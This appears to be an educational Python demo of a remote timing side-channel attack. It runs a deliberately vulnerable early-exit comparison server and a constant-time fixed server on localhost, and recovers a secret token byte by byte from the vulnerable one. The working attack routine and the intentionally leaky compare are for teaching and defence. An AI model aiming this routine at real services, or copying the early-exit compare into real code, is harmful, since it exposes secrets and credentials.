"""Timing side-channel: the cheapest possible entry point into this whole field - no probe,
no amplifier, no ADC, no oscilloscope. Just a stopwatch.

## The vulnerability

A naive secret comparison (`for a, b in zip(guess, secret): if a != b: return False`) exits
the instant it finds a mismatch. The more of the guess's PREFIX matches the secret, the longer
the comparison runs before exiting - and that extra time is measurable over a network
connection with nothing more than repeated timing and averaging. Guess one byte at a time,
keep whichever candidate makes the server take longest, and the secret falls out byte by byte
without ever needing to see the comparison's result. This is the attack from Kocher's original
1996 timing-attacks paper, made remotely practical by Brumley & Boneh, "Remote Timing Attacks
Are Practical" (USENIX Security 2003); Crosby, Wallach & Riedi, "Opportunities and Limits of
Remote Timing Attacks" (2009) is the reference for the min-of-many-trials noise filter used
below (network jitter only ever ADDS delay, so the minimum observed time across repeated
trials is the best estimate of the true underlying cost).

## The fix

Compare EVERY byte regardless of earlier mismatches (no early exit) and combine the result
with OR-of-XOR rather than a branch, so total execution time depends only on the guess's
LENGTH, never its content. `hmac.compare_digest` is Python's version of this;
`services/jwt`'s `jwt_verify_hs256` in this repository's C++ library already does the same for
exactly this reason.

    python timing_engine.py     # runs both servers and both attacks, end to end
"""

import hmac
import socket
import threading
import time

SECRET = b"c0ffee"  # 6-byte token from a 16-symbol alphabet - keeps the demo fast
ALPHABET = b"0123456789abcdef"
PER_BYTE_DELAY_S = 0.008  # exaggerated vs. real hardware so OS thread-scheduling jitter can't hide it
DEFAULT_TRIALS = 9  # min-of-N: more trials buys more jitter margin at the cost of wall-clock time


class _CompareServer:
    """A tiny TCP server: a connection stays open and pipelines many sequential guess/response
    round trips (like a real interactive auth session would) - measuring one connection = one
    guess instead adds thousands of TCP handshakes' worth of OS-level connection-churn noise
    (ephemeral port pressure, TIME_WAIT buildup) on top of the few-ms signal this attack is
    trying to measure, which swamps it faster than the comparison timing itself ever would.
    Override _compare()."""

    def __init__(self, secret: bytes, delay_s: float = PER_BYTE_DELAY_S, host="127.0.0.1", port=0):
        self.secret = secret
        self.delay_s = delay_s
        self.host = host
        self.port = port
        self._sock = None
        self._thread = None
        self.running = False

    def _compare(self, guess: bytes) -> bool:
        raise NotImplementedError

    def start(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.host, self.port))
        self.port = self._sock.getsockname()[1]
        self._sock.listen(8)
        self._sock.settimeout(1.0)
        self.running = True
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _serve(self):
        while self.running:
            try:
                conn, _ = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break  # stop() closed the listening socket out from under us
            threading.Thread(target=self._handle, args=(conn,), daemon=True).start()

    def _handle(self, conn: socket.socket):
        with conn:
            conn.settimeout(5)
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Nagle's algorithm can
            # hold a small packet for tens of ms waiting to coalesce it with more data - noise
            # far bigger than the few-ms signal this whole attack depends on measuring cleanly.
            try:
                while True:
                    data = conn.recv(len(self.secret))
                    if not data:
                        break  # client closed
                    ok = self._compare(data)
                    conn.sendall(b"\x01" if ok else b"\x00")
            except (socket.timeout, ConnectionError):
                pass

    def stop(self):
        self.running = False
        if self._sock:
            self._sock.close()


class VulnerableCompareServer(_CompareServer):
    """The vulnerability: early-exit byte-by-byte compare. Total time scales with how much of
    the guess's prefix matched, which is exactly what a timing attacker measures."""

    def _compare(self, guess: bytes) -> bool:
        if len(guess) != len(self.secret):
            return False
        for a, b in zip(guess, self.secret):
            if a != b:
                return False
            time.sleep(self.delay_s)  # the cost of confirming this byte before advancing -
            # NOT paid on the byte that mismatches, which is exactly the leak. (Sleeping
            # unconditionally BEFORE the check instead would erase the signal on the very
            # last byte specifically: a right and a wrong final guess would then pay for the
            # exact same number of sleeps, since there is no further position left to advance
            # into either way - a subtle, real property of *where* the timing cost is paid.)
        return True


class ConstantTimeCompareServer(_CompareServer):
    """The fix: always walk every byte, combine with OR-of-XOR (no branch on the result until
    the very end). Total time depends only on len(guess), never on its content."""

    def _compare(self, guess: bytes) -> bool:
        if len(guess) != len(self.secret):
            return False
        acc = 0
        for a, b in zip(guess, self.secret):
            acc |= a ^ b
            time.sleep(self.delay_s)  # the same per-byte cost, paid unconditionally for every
            # byte regardless of match - placement within the loop body doesn't matter here,
            # since every byte is always processed either way.
        return hmac.compare_digest(bytes([acc]), b"\x00")


def _timed_request(sock: socket.socket, guess: bytes) -> float:
    t0 = time.perf_counter()
    sock.sendall(guess)
    sock.recv(16)
    return time.perf_counter() - t0


def _measure_latencies(host: str, port: int, guesses, trials: int = DEFAULT_TRIALS):
    """One persistent connection, pipelining `trials` timed round trips for EACH guess in
    `guesses` - minimum-of-trials per guess (jitter only adds delay, so the minimum is the
    least-biased estimate of the true underlying cost). Returns a dict {guess: min_latency}."""
    out = {}
    with socket.create_connection((host, port), timeout=5) as s:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        for guess in guesses:
            out[guess] = min(_timed_request(s, guess) for _ in range(trials))
    return out


def position_latency_spread(host: str, port: int, known_prefix: bytes, secret_len: int,
                             alphabet: bytes = ALPHABET, trials: int = DEFAULT_TRIALS) -> float:
    """max-min latency across every candidate byte at the next position - large on a
    vulnerable server (the right candidate visibly runs longest), near the measurement noise
    floor on a constant-time one. A clean, single-number way to SEE the fix working."""
    pad = secret_len - len(known_prefix) - 1
    guesses = [known_prefix + bytes([c]) + b"\x00" * pad for c in alphabet]
    latencies = _measure_latencies(host, port, guesses, trials).values()
    return max(latencies) - min(latencies)


def _best_candidate(host, port, known: bytes, pad: int, alphabet: bytes, trials: int) -> int:
    guesses = [known + bytes([c]) + b"\x00" * pad for c in alphabet]
    latencies = _measure_latencies(host, port, guesses, trials)
    best_guess = max(latencies, key=latencies.get)
    return best_guess[len(known)]


def recover_secret_via_timing(host: str, port: int, secret_len: int, alphabet: bytes = ALPHABET,
                               trials: int = 4, rounds: int = 3) -> bytes:
    """Byte-by-byte: at each position, whichever candidate makes the server take longest is
    the real byte (more prefix matched = more early-exit delay accumulated before it).
    Each position's decision is a MAJORITY VOTE across `rounds` independent full alphabet
    scans (each itself a min-of-`trials` measurement) - a single unlucky scheduling spike
    during one scan needs company from a second independent scan to flip the final answer,
    which is a much rarer coincidence than one bad scan alone."""
    known = bytearray()
    for _ in range(secret_len):
        pad = secret_len - len(known) - 1
        votes = {}
        for _round in range(rounds):
            winner = _best_candidate(host, port, bytes(known), pad, alphabet, trials)
            votes[winner] = votes.get(winner, 0) + 1
        known.append(max(votes.items(), key=lambda kv: kv[1])[0])
    return bytes(known)


if __name__ == "__main__":
    print("[*] Timing side-channel: recovering a secret with nothing but a stopwatch")

    vulnerable = VulnerableCompareServer(SECRET)
    vulnerable.start()
    time.sleep(0.1)
    print(f"[*] Vulnerable server up on 127.0.0.1:{vulnerable.port} (early-exit compare)")
    recovered = recover_secret_via_timing("127.0.0.1", vulnerable.port, len(SECRET))
    print(f"    recovered: {recovered!r}  actual: {SECRET!r}")
    vuln_spread = position_latency_spread("127.0.0.1", vulnerable.port, b"", len(SECRET))
    vulnerable.stop()
    assert recovered == SECRET, "timing attack failed to recover the secret from the vulnerable server"
    print(f"    OK - latency spread at position 0: {vuln_spread * 1000:.2f} ms")

    hardened = ConstantTimeCompareServer(SECRET)
    hardened.start()
    time.sleep(0.1)
    print(f"[*] Constant-time server up on 127.0.0.1:{hardened.port} (compare_digest-style)")
    hard_spread = position_latency_spread("127.0.0.1", hardened.port, b"", len(SECRET))
    hardened.stop()
    print(f"    latency spread at position 0: {hard_spread * 1000:.2f} ms")

    print("\n================ RESULTS ================")
    print(f"Vulnerable server : secret recovered = {recovered == SECRET}, "
          f"spread = {vuln_spread * 1000:.2f} ms")
    print(f"Hardened server   : spread = {hard_spread * 1000:.2f} ms "
          f"({vuln_spread / max(hard_spread, 1e-9):.0f}x smaller)")
    print("==========================================")
    assert vuln_spread > 3 * hard_spread, "constant-time server's spread should collapse toward the noise floor"
    print("[+] OK - the fix visibly removes the signal an attacker would need")
